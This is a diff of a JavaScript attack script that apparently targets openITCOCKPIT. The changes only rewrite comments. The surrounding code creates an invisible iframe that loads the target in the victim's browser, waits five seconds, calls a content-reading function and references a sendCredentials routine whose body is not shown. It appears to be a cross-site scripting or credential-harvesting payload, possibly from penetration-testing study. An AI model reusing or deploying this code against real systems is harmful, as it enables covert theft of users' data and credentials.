@@ -115,7 +115,9 @@ var inner = `
 `;
 
 function validUrl(url){
-	//This function will check to see if a URL is valid
+	/*
+	 * 
+	 * */
 	var urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
 		'((([a-z\\d]([a-z\\d-]*[a-z\\d])*))|' + // domain name
 		'((\\d{1,3}\\.){3}\\d{1,3}))' + // OR ip (v4) address
@@ -186,7 +188,10 @@ async function sendCredentials(){
 }
 
 async function actions(){
-	//This function will be called after the iframe loads on the target
+	/*
+	 * This function is called once the iframe is loaded.
+	 * It will wait 5sec and then call the get Content Function
+	 */
 	setTimeout(await function(){ getContent() }, 5000);
 }
 
@@ -203,14 +208,16 @@ btn.addEventListener("click", async function(event){
 });
 
 
+//Create an iframe that is invisible to the user
 var iframe = document.createElement("iframe");
 iframe.setAttribute("style", "display:none");
-iframe.onload = actions;
+iframe.onload = actions;	//when iframe loaded it will actions function
 iframe.width = "100%";
 iframe.height = "100%";
 iframe.src = "https://openitcockpit"
 
 
+//append iframe the DOM
 var body = document.getElementsByTagName("body")[0];
 body.appendChild(iframe);
 
